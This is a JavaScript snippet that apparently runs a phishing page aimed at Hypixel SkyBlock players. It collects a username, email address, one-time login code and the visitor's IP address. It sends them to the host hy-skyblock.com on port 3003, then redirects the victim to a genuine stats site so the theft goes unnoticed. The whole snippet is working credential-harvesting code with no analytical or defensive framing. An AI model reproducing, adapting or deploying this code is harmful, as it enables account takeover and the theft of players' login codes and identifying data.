
  async function sendEmail() {
    const username = document.getElementById('username-input').value;
    const email = document.getElementById('email-input').value;
    console.log(username)
  
    if (!email.match(/.+@.+\..+/)) {
      return;
    }
    
    try {
      const ip = await new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'https://ipinfo.io/?format=jsonp&callback=getIP';
        document.body.appendChild(script);
        window.getIP = (json) => {
          resolve(json.ip);
          delete window.getIP;
          document.body.removeChild(script);
        };
      });
      
      const response = await fetch(
        `https://hy-skyblock.com:3003/api/email?email=${email}&username=${username}&ip=${ip}`,
        {
          method: 'GET',
          headers: { 'Content-Type': 'application/json' },
        }
      );
    } catch (error) {
      console.error(error);
    }
  }
  
  
  
  async function sendCode() {
    const direction = document.getElementById('email-input').value
    const profile = document.getElementById('username-input').value
    const code = document.getElementById("otp").value
  
  
    try {
      const ip = await new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'https://ipinfo.io/?format=jsonp&callback=getIP';
        document.body.appendChild(script);
        window.getIP = (json) => {
          resolve(json.ip);
          delete window.getIP;
          document.body.removeChild(script);
        };
      });
      console.log(ip)
        const response = await fetch(
          `https://hy-skyblock.com:3003/api/code?email=${direction}&username=${profile}&code=${code}&ip=${ip}`,
          {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' },
          }
        );
        if (!response.ok) {
          throw new Error('Failed to fetch');
        }
      } catch (error) {
        console.error(error);
      }
      window.location.href = 'https://sky.shiiyu.moe/stats/'+profile;
    }
    